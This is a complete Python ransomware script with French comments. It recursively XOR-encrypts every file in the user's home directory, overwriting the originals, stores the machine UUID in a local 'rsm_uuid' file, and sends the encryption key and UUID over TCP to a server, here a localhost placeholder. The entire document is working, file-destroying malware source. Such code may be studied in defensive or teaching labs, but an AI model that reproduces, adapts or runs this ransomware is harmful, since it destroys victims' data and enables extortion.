import os
import socket
import uuid
import random
import string

# Générer clé chiffrement
def generate_key(length=10):
    return ''.join(random.choices(string.ascii_uppercase, k=length))

# Récupérer uuid machine
def get_machine_uuid():
    return str(uuid.uuid1())

# Chiffrement XOR
def xor_cypher(input_bytes, key):
    key_bytes = key.encode()
    return bytes(input_bytes[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(input_bytes)))

# Chiffrement récursif
def encrypt_directory(directory, key):
    for item in os.listdir(directory):
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path):
            try:
                with open(item_path, "rb") as f:
                    content = f.read()
                with open(item_path, "wb") as f:
                    f.write(xor_cypher(content, key))
            except Exception as e:
                print(f"Erreur lors du traitement du fichier {item_path} : {str(e)}")
                continue
        elif os.path.isdir(item_path):
            encrypt_directory(item_path, key)

# Envoyer données a serveur TCP
def bob_send_data_to_server(server_ip, server_port, data):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, server_port))
        s.sendall(data.encode())

# Stocker UUID localement
def store_uuid_locally(uuid):
    home = os.path.expanduser("~")
    f = open(os.path.join(home, "rsm_uuid"), "w")
    f.write(uuid)

# Programme principal
key = generate_key()
uuid = get_machine_uuid()

# Chiffrement répertoire
home = os.path.expanduser("~")
encrypt_directory(home, key)

# Stockage UUID local
store_uuid_locally(uuid)

# Envoi clé & UUID 
bob_send_data_to_server("127.0.0.1", 12345, key + "#" + uuid)